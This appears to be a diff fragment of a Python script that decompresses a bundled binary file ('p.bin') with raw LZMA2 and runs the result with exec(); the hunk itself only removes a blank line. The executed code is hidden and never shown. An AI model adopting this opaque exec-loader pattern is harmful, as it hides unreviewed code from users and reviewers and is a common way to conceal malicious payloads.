@@ -9,4 +9,3 @@ B = os.path.join(os.path.dirname(os.path.abspath(__file__)), "p.bin")
 exec(lzma.decompress(open(B, "rb").read(), format=lzma.FORMAT_RAW,
                      filters=[{"id": lzma.FILTER_LZMA2, "preset": 2147483657,
                                "lc": 2, "lp": 0, "pb": 0}]))
-
